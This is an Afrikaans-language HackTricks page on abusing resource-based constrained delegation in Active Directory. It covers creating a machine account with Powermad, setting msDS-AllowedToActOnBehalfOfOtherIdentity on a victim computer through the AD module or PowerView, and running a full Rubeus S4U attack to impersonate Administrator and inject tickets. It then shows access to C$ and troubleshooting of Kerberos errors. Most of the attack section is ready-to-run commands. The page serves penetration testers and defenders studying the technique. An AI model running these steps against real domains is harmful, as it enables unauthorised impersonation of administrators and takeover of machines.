# Bron-gebaseerde Beperkte Delegasie

<details>

<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Basiese van Bron-gebaseerde Beperkte Delegasie

Dit is soortgelyk aan die basiese [Beperkte Delegasie](constrained-delegation.md) maar **in plaas daarvan** om toestemmings te gee aan 'n **voorwerp** om **enige gebruiker te verteenwoordig teenoor 'n diens**. Bron-gebaseerde Beperkte Delegasie **stel in die voorwerp wie in staat is om enige gebruiker te verteenwoordig teenoor dit**.

In hierdie geval sal die beperkte voorwerp 'n eienskap hê genaamd _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ met die naam van die gebruiker wat enige ander gebruiker teenoor dit kan verteenwoordig.

'n Ander belangrike verskil van hierdie Beperkte Delegasie tot die ander delegasies is dat enige gebruiker met **skryfregte oor 'n rekenaarrekening** (_GenericAll/GenericWrite/WriteDacl/WriteProperty ens_) die _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ kan instel (In die ander vorme van Delegasie het jy domein-admin-privileges nodig).

### Nuwe Konsepte

Terug in Beperkte Delegasie is daar gesê dat die **`TrustedToAuthForDelegation`** vlag binne die _userAccountControl_ waarde van die gebruiker nodig is om 'n **S4U2Self** uit te voer. Maar dit is nie heeltemal waar nie.\
Die werklikheid is dat selfs sonder daardie waarde, kan jy 'n **S4U2Self** uitvoer teen enige gebruiker as jy 'n **diens** is (het 'n SPN) maar, as jy **`TrustedToAuthForDelegation` het** sal die teruggekeerde TGS **Forwardable** wees en as jy **nie** daardie vlag het nie, sal die teruggekeerde TGS **nie** **Forwardable** wees nie.

Nietemin, as die **TGS** wat in **S4U2Proxy** gebruik word **NIET Forwardable** is en jy probeer om 'n **basiese Beperkte Delegasie** te misbruik, sal dit **nie werk nie**. Maar as jy probeer om 'n **Bron-gebaseerde beperkte delegasie te benut, sal dit werk** (dit is nie 'n kwesbaarheid nie, dit is 'n kenmerk, blykbaar).

### Aanvalstruktuur

> As jy **skryf-ekwivalente regte** oor 'n **Rekenaar**-rekening het, kan jy **bevoorregte toegang** tot daardie masjien verkry.

Stel dat die aanvaller reeds **skryf-ekwivalente regte oor die slagofferrekenaar** het.

1. Die aanvaller **kompromiteer** 'n rekening wat 'n **SPN** het of **skep een** (“Diens A”). Let daarop dat **enige** _Admin-gebruiker_ sonder enige ander spesiale voorreg tot 10 **Rekenaarvoorwerpe (**_**MachineAccountQuota**_**)** kan **skep** en hulle 'n **SPN** kan instel. So die aanvaller kan net 'n Rekenaarvoorwerp skep en 'n SPN instel.
2. Die aanvaller **misbruik sy SKRYF-voorreg** oor die slagofferrekenaar (DiensB) om **bron-gebaseerde beperkte delegasie te konfigureer om DiensA toe te laat om enige gebruiker te verteenwoordig** teen daardie slagofferrekenaar (DiensB).
3. Die aanvaller gebruik Rubeus om 'n **volledige S4U-aanval** (S4U2Self en S4U2Proxy) van Diens A na Diens B vir 'n gebruiker **met bevoorregte toegang tot Diens B** uit te voer.
1. S4U2Self (vanaf die SPN gekompromiteerde/gemaakte rekening): Vra vir 'n **TGS van Administrateur aan my** (Nie Forwardable).
2. S4U2Proxy: Gebruik die **nie Forwardable TGS** van die vorige stap om 'n **TGS** van **Administrateur** na die **slagoffer-gashuis** te vra.
3. Selfs al gebruik jy 'n nie Forwardable TGS, aangesien jy Bron-gebaseerde beperkte delegasie benut, sal dit werk.
4. Die aanvaller kan die **kaartjie deurgee** en **vertolk** die gebruiker om **toegang tot die slagoffer DiensB** te verkry.

Om die _**MachineAccountQuota**_ van die domein te kontroleer, kan jy gebruik:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Aanval

### Skep 'n Rekenaarobjek

Jy kan 'n rekenaarobjek binne die domein skep deur [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurasie van Hulpbron-gebaseerde Beperkte Delegering

**Met behulp van die activedirectory PowerShell-module**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Deur powerview te gebruik**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Uitvoering van 'n volledige S4U-aanval

Eerstens het ons die nuwe Rekenaarobjek geskep met die wagwoord `123456`, dus het ons die has van daardie wagwoord nodig:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Dit sal die RC4 en AES hasings vir daardie rekening druk.\
Nou kan die aanval uitgevoer word:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Jy kan meer kaartjies genereer deur net een keer te vra deur die `/altservice` param van Rubeus te gebruik:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Let daarop dat gebruikers 'n eienskap genaamd "**Kan nie gedelegeer word nie**" het. As 'n gebruiker hierdie eienskap na Waar het, sal jy hom nie kan impersoneer nie. Hierdie eienskap kan binne bloodhound gesien word.
{% endhint %}

### Toegang

Die laaste opdraglyn sal die **volledige S4U-aanval uitvoer en die TGS** van die Administrateur na die slagoffer-gashuis in **geheue** inspuit.\
In hierdie voorbeeld is 'n TGS vir die **CIFS**-diens van die Administrateur aangevra, sodat jy toegang sal hê tot **C$**:
```bash
ls \\victim.domain.local\C$
```
### Misbruik van verskillende dienstikette

Leer oor die [**beskikbare dienstikette hier**](silver-ticket.md#beskikbare-dienste).

## Kerberos Foute

* **`KDC_ERR_ETYPE_NOTSUPP`**: Dit beteken dat kerberos ingestel is om nie DES of RC4 te gebruik nie en jy verskaf net die RC4-hash. Verskaf aan Rubeus ten minste die AES256-hash (of verskaf net die rc4, aes128 en aes256-hashes). Voorbeeld: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Dit beteken dat die tyd van die huidige rekenaar verskil van dié van die DC en kerberos werk nie behoorlik nie.
* **`preauth_failed`**: Dit beteken dat die gegewe gebruikersnaam + hassele nie werk om in te teken nie. Jy het dalk vergeet om die "$" binne die gebruikersnaam te sit toe jy die hassele genereer het (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Dit kan beteken:
  * Die gebruiker wat jy probeer om te impersoneer, kan nie toegang kry tot die gewenste diens nie (omdat jy dit nie kan impersoneer nie of omdat dit nie genoeg regte het nie)
  * Die gevraagde diens bestaan nie (as jy vir 'n kaartjie vir winrm vra, maar winrm nie loop nie)
  * Die fake-rekenaar wat geskep is, het sy regte oor die kwesbare bediener verloor en jy moet dit teruggee.

## Verwysings

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
